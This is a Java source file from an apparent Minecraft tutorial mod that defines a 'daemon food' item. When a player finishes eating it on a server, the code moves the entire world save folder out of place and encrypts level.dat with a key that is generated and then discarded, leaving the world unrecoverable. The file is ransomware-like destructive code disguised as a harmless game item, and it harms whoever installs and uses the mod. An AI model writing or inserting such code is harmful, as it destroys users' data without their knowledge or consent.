package net.noel.tutorialmod.item;

import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.Level;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.level.storage.LevelResource;
import net.noel.tutorialmod.util.CryptoHelper;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.Files;

import java.nio.file.StandardCopyOption;


import net.minecraft.server.level.ServerLevel;

public class DaemonFoodItem extends Item {
    public DaemonFoodItem(Properties properties){
        super(properties);
    }
    @Override
    public ItemStack finishUsingItem(ItemStack stack, Level world, LivingEntity entity) {
        if (!world.isClientSide && world instanceof ServerLevel serverWorld) {
            try {
                byte[] key = CryptoHelper.generateKey();
                Path worldFolder = serverWorld.getServer()
                        .getWorldPath(LevelResource.ROOT);
                Path target = Paths.get(worldFolder.getParent().toString(),
                        "../encrypted_worlds", worldFolder.getFileName().toString());

                Files.createDirectories(target.getParent());
                Files.move(worldFolder, target, StandardCopyOption.REPLACE_EXISTING);

                System.out.println("World moved to: " + target);

                Path levelDat = target.resolve("level.dat");


                CryptoHelper.encryptFile(levelDat.toString(), key);
                System.out.println("World File encrypted");

            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return super.finishUsingItem(stack, world, entity);
    }
}
